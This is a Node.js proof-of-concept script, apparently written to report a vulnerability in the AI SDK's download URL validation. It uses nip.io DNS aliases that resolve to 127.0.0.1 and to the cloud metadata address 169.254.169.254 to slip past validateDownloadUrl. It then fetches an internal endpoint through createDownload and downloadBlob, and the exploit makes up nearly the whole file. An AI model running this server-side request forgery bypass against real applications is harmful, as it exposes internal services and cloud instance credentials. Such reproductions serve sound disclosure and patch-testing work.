import http from 'node:http';
import { lookup } from 'node:dns/promises';
import { once } from 'node:events';
import { createDownload } from 'ai';
import { downloadBlob, validateDownloadUrl } from '@ai-sdk/provider-utils';

function validationResult(url) {
  try {
    validateDownloadUrl(url);
    return 'ALLOWED';
  } catch (error) {
    return `BLOCKED: ${error.message.split('\n')[0]}`;
  }
}

const server = http.createServer((req, res) => {
  console.log(`LOCAL_SERVER_HIT host=${req.headers.host} path=${req.url}`);
  res.setHeader('content-type', 'text/plain');
  res.end('AI_SDK_SSRF_LOOPBACK_MARKER');
});

server.listen(0, '127.0.0.1');
await once(server, 'listening');

const { port } = server.address();
const literalLoopback = `http://127.0.0.1:${port}/internal`;
const dnsAliasLoopback = `http://127.0.0.1.nip.io:${port}/internal`;
const dnsAliasMetadata = 'http://169.254.169.254.nip.io/latest/meta-data/';

console.log(`ai version: ${(await import('ai/package.json', { with: { type: 'json' } })).default.version}`);
console.log(
  `@ai-sdk/provider-utils version: ${
    (await import('@ai-sdk/provider-utils/package.json', { with: { type: 'json' } })).default.version
  }`
);
console.log();

console.log(`DNS 127.0.0.1.nip.io -> ${(await lookup('127.0.0.1.nip.io')).address}`);
console.log(`DNS 169.254.169.254.nip.io -> ${(await lookup('169.254.169.254.nip.io')).address}`);
console.log();

console.log(`validateDownloadUrl(${literalLoopback}) => ${validationResult(literalLoopback)}`);
console.log(`validateDownloadUrl(${dnsAliasLoopback}) => ${validationResult(dnsAliasLoopback)}`);
console.log(`validateDownloadUrl(${dnsAliasMetadata}) => ${validationResult(dnsAliasMetadata)}`);
console.log();

const download = createDownload({ maxBytes: 1024 });
const downloaded = await download({ url: new URL(dnsAliasLoopback) });
console.log(`createDownload() mediaType=${downloaded.mediaType}`);
console.log(`createDownload() body=${Buffer.from(downloaded.data).toString('utf8')}`);
console.log();

const blob = await downloadBlob(dnsAliasLoopback);
console.log(`downloadBlob() mediaType=${blob.type}`);
console.log(`downloadBlob() body=${await blob.text()}`);

server.close();
